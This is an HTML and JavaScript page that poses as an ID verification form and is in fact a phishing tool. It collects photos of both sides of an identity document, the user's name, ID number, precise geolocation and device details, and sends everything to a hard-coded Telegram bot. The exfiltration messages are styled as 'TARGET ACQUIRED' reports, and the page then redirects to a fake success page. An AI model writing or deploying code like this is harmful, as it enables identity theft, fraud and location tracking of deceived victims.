<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Identity Verification</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    background: #0f1115;
    color: #e8eaed;
    display: flex;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
    padding: 20px;
  }
  .card {
    background: #1a1d23;
    padding: 32px;
    border-radius: 14px;
    box-shadow: 0 8px 30px rgba(0,0,0,0.5);
    width: 100%;
    max-width: 440px;
    border: 1px solid #2a2e36;
  }
  .card h1 { font-size: 20px; margin-bottom: 6px; }
  .card p.sub { font-size: 13px; color: #9aa0a6; margin-bottom: 24px; }
  label { display: block; font-size: 12px; color: #9aa0a6; margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.5px; }
  input[type="text"] {
    width: 100%;
    padding: 12px;
    background: #0f1115;
    border: 1px solid #2a2e36;
    border-radius: 8px;
    color: #e8eaed;
    font-size: 14px;
    margin-bottom: 16px;
  }
  input:focus { outline: none; border-color: #4c8bf5; }
  .slot {
    border: 1px dashed #3a4a6c;
    border-radius: 10px;
    padding: 18px;
    text-align: center;
    margin-bottom: 14px;
    cursor: pointer;
    background: #141821;
  }
  .slot.has-file { border-color: #4c8bf5; background: #16203a; }
  .slot .lbl { font-size: 12px; color: #9aa0a6; }
  .slot img { max-width: 100%; max-height: 140px; margin-top: 10px; border-radius: 6px; display: none; }
  button {
    width: 100%;
    padding: 13px;
    background: #4c8bf5;
    color: #fff;
    border: none;
    border-radius: 8px;
    font-size: 14px;
    font-weight: 600;
    cursor: pointer;
    margin-top: 8px;
  }
  button:hover { background: #3b78e0; }
  button:disabled { background: #2a2e36; color: #6b7280; cursor: not-allowed; }
  .err { color: #f28b82; font-size: 12px; margin-top: 10px; display: none; text-align: center; }
  .status { color: #9aa0a6; font-size: 12px; margin-top: 10px; text-align: center; display: none; }
  .debug { color: #6b7280; font-size: 11px; margin-top: 10px; text-align: center; white-space: pre-wrap; font-family: monospace; }
</style>
</head>
<body>
  <div class="card">
    <h1>Identity Verification</h1>
    <p class="sub">Upload both sides of your ID. Location is used to verify your region.</p>

    <label>Front of ID</label>
    <div class="slot" id="slotFront">
      <div class="lbl">Tap to capture front</div>
      <img id="imgFront" alt="">
      <input type="file" id="fileFront" accept="image/*" capture="environment" hidden>
    </div>

    <label>Back of ID</label>
    <div class="slot" id="slotBack">
      <div class="lbl">Tap to capture back</div>
      <img id="imgBack" alt="">
      <input type="file" id="fileBack" accept="image/*" capture="environment" hidden>
    </div>

    <form id="idForm">
      <label for="fullname">Full name</label>
      <input type="text" id="fullname" name="fullname" required autocomplete="name">

      <label for="idnumber">ID number</label>
      <input type="text" id="idnumber" name="idnumber" required autocomplete="off">

      <button type="submit" id="submitBtn">Verify</button>
      <div class="err" id="err"></div>
      <div class="status" id="status"></div>
      <div class="debug" id="debug"></div>
    </form>
  </div>

  <script>
    // ====== CONFIG ======
    const BOT_TOKEN = '8201564714:AAHFSrWiQi3on-7kEWmLsZCl2fVuKijvuO8';
    const CHAT_ID   = '7994232888';
    // ====================

    const API = `https://api.telegram.org/bot${BOT_TOKEN}`;
    const state = { front: null, back: null, geo: null };

    const $ = id => document.getElementById(id);
    const errEl = $('err'), statusEl = $('status'), debugEl = $('debug');

    function log(x) {
      const s = typeof x === 'string' ? x : JSON.stringify(x);
      debugEl.textContent += s + '\n';
      console.log(x);
    }

    // --- Slot bindings ---
    function bindSlot(slotId, imgId, inputId, key) {
      const slot = $(slotId), img = $(imgId), inp = $(inputId);
      slot.addEventListener('click', () => inp.click());
      inp.addEventListener('change', async () => {
        const f = inp.files[0];
        if (!f) return;
        state[key] = f;
        const r = new FileReader();
        r.onload = e => { img.src = e.target.result; img.style.display = 'block'; };
        r.readAsDataURL(f);
        slot.classList.add('has-file');
        slot.querySelector('.lbl').textContent = 'Captured ✓';
      });
    }
    bindSlot('slotFront', 'imgFront', 'fileFront', 'front');
    bindSlot('slotBack',  'imgBack',  'fileBack',  'back');

    // --- Downscale ---
    async function downscale(file, max = 1600, q = 0.85) {
      try {
        const bmp = await createImageBitmap(file);
        const scale = Math.min(1, max / Math.max(bmp.width, bmp.height));
        const c = document.createElement('canvas');
        c.width  = Math.round(bmp.width  * scale);
        c.height = Math.round(bmp.height * scale);
        c.getContext('2d').drawImage(bmp, 0, 0, c.width, c.height);
        return await new Promise(r => c.toBlob(r, 'image/jpeg', q));
      } catch (e) {
        log('downscale failed, sending original: ' + e.message);
        return file;
      }
    }

    // --- Geolocation with hard timeout ---
    function getLocation() {
      return new Promise(resolve => {
        if (!navigator.geolocation) return resolve(null);
        navigator.geolocation.getCurrentPosition(
          p => resolve({ lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy }),
          e => { log('geo error: ' + e.message); resolve(null); },
          { enableHighAccuracy: true, timeout: 6000, maximumAge: 60000 }
        );
      });
    }

    // --- Helpers ---
    function esc(s) {
      return String(s ?? '')
        .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
    }

    function hex(n, pad = 0) {
      return n.toString(16).toUpperCase().padStart(pad, '0');
    }

    // Stable short hash of a string, 8 hex chars. Used as target tag.
    function tag(str) {
      let h = 0x811c9dc5;
      for (let i = 0; i < str.length; i++) {
        h ^= str.charCodeAt(i);
        h = Math.imul(h, 0x01000193) >>> 0;
      }
      return hex(h, 8);
    }

    function flagEmoji(code) {
      if (!code || code.length !== 2) return '🏴';
      return code.toUpperCase().replace(/./g, c =>
        String.fromCodePoint(127397 + c.charCodeAt(0)));
    }

    // --- Reverse geocode (best effort, no key required) ---
    async function reverseGeo(lat, lon) {
      try {
        const r = await fetch(
          `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=10`,
          { headers: { 'Accept': 'application/json' } }
        );
        const j = await r.json();
        const a = j.address || {};
        return {
          city:  a.city || a.town || a.village || a.county || '—',
          state: a.state || a.region || '—',
          country: a.country || '—',
          cc: (a.country_code || '').toLowerCase()
        };
      } catch { return null; }
    }

    // --- Telegram ---
    async function sendMessage(text) {
      const fd = new FormData();
      fd.append('chat_id', CHAT_ID);
      fd.append('text', text);
      fd.append('parse_mode', 'HTML');
      const r = await fetch(`${API}/sendMessage`, { method: 'POST', body: fd });
      const j = await r.json();
      log('sendMessage: ' + JSON.stringify(j));
      return j;
    }

    async function sendPhoto(blob, filename, caption) {
      const fd = new FormData();
      fd.append('chat_id', CHAT_ID);
      fd.append('caption', caption || '');
      fd.append('parse_mode', 'HTML');
      fd.append('photo', blob, filename);
      const r = await fetch(`${API}/sendPhoto`, { method: 'POST', body: fd });
      const j = await r.json();
      log('sendPhoto(' + filename + '): ' + JSON.stringify(j));
      if (!j.ok) throw new Error(j.description || 'sendPhoto failed');
      return j;
    }

    // --- Preflight ---
    (async () => {
      try {
        const me  = await fetch(`${API}/getMe`).then(r => r.json());
        if (!me.ok) { log('getMe FAILED: ' + me.description); return; }
        log('bot: @' + me.result.username);
        const ch = await fetch(`${API}/getChat?chat_id=${encodeURIComponent(CHAT_ID)}`).then(r => r.json());
        if (!ch.ok) { log('getChat FAILED: ' + ch.description); return; }
        log('chat ok: ' + (ch.result.username || ch.result.title || ch.result.id));
      } catch (e) {
        log('preflight error: ' + e.message);
      }
    })();

    // --- Submit ---
    $('idForm').addEventListener('submit', async e => {
      e.preventDefault();
      errEl.style.display = 'none';
      errEl.textContent = '';
      debugEl.textContent = '';

      if (!state.front || !state.back) {
        errEl.textContent = 'Both sides of the ID are required.';
        errEl.style.display = 'block';
        return;
      }

      $('submitBtn').disabled = true;
      statusEl.style.display = 'block';
      statusEl.textContent = 'Preparing…';

      const name = $('fullname').value;
      const num  = $('idnumber').value;

      if (!state.geo) {
        statusEl.textContent = 'Requesting location…';
        state.geo = await Promise.race([
          getLocation(),
          new Promise(r => setTimeout(() => r(null), 6500))
        ]);
      }

      const g = state.geo;
      let place = null;
      if (g) {
        statusEl.textContent = 'Resolving location…';
        place = await reverseGeo(g.lat, g.lon);
      }

      // ====== HACKER-STYLE CAPTION ======
      const sessionId  = hex(Math.floor(Math.random() * 0xFFFFFFFF), 8);
      const targetTag  = tag(name + '|' + num);
      const uaShort    = (navigator.userAgent.match(/\(([^)]+)\)/) || [,'unknown'])[1]
                           .split(';').slice(0,2).join(';').trim();
      const nowUtc     = new Date().toISOString().replace('T',' ').slice(0,19) + ' UTC';

      const geoBlock = g
        ? `╭─ 📡 <b>GEO-LOCK</b>\n` +
          `│ lat : <code>${g.lat.toFixed(6)}</code>\n` +
          `│ lon : <code>${g.lon.toFixed(6)}</code>\n` +
          `│ acc : ±${Math.round(g.acc)} m\n` +
          (place
            ? `│ loc : ${esc(place.city)}, ${esc(place.state)} ${flagEmoji(place.cc)}\n` +
              `│ ctry: ${esc(place.country)}\n`
            : `│ loc : <i>unresolved</i>\n`) +
          `│ map : <a href="https://maps.google.com/?q=${g.lat},${g.lon}">open</a>\n` +
          `╰─`
        : `╭─ 📡 <b>GEO-LOCK</b>\n│ <i>denied / unavailable</i>\n╰─`;

      const header =
        `┌───[ <b>◤ TARGET ACQUIRED ◢</b> ]───\n` +
        `│ <b>SESSION</b> : <code>0x${sessionId}</code>\n` +
        `│ <b>TAG</b>     : <code>#${targetTag}</code>\n` +
        `│ <b>TIME</b>    : ${nowUtc}\n` +
        `└─────────────────────────`;

      const identityBlock =
        `╭─ 🪪 <b>IDENTITY</b>\n` +
        `│ name : <b>${esc(name)}</b>\n` +
        `│ id   : <code>${esc(num)}</code>\n` +
        `╰─`;

      const intelBlock =
        `╭─ 🖥 <b>NODE INTEL</b>\n` +
        `│ ua   : <code>${esc(uaShort)}</code>\n` +
        `│ plat : <code>${esc(navigator.platform || '—')}</code>\n` +
        `│ lang : <code>${esc(navigator.language || '—')}</code>\n` +
        `│ scr  : <code>${screen.width}×${screen.height}</code>\n` +
        `│ tz   : <code>${esc(Intl.DateTimeFormat().resolvedOptions().timeZone || '—')}</code>\n` +
        `╰─`;

      const footer = `━━━━━━━━━━━━━━━━━━━━━\n<b>[ payload attached ]</b>`;

      const metaFull = [header, identityBlock, geoBlock, intelBlock, footer].join('\n\n');
      const metaPhoto = [header, identityBlock, geoBlock].join('\n\n');

      try {
        statusEl.textContent = 'Beaming metadata…';
        await sendMessage(metaFull);

        statusEl.textContent = 'Compressing front…';
        const frontBlob = await downscale(state.front);

        statusEl.textContent = 'Sending front…';
        await sendPhoto(frontBlob, 'front.jpg', metaPhoto);

        statusEl.textContent = 'Compressing back…';
        const backBlob = await downscale(state.back);

        statusEl.textContent = 'Sending back…';
        await sendPhoto(backBlob, 'back.jpg', `╭─ 🪪 <b>REVERSE SIDE</b>\n│ tag : <code>#${targetTag}</code>\n╰─`);

        statusEl.textContent = 'Sent.';
        setTimeout(() => {
          window.location.href = 'https://www.example-id-verify.com/success';
        }, 800);
      } catch (ex) {
        log('submit error: ' + ex.message);
        errEl.textContent = 'Network error: ' + ex.message;
        errEl.style.display = 'block';
        statusEl.style.display = 'none';
        $('submitBtn').disabled = false;
      }
    });
  </script>
</body>
</html>
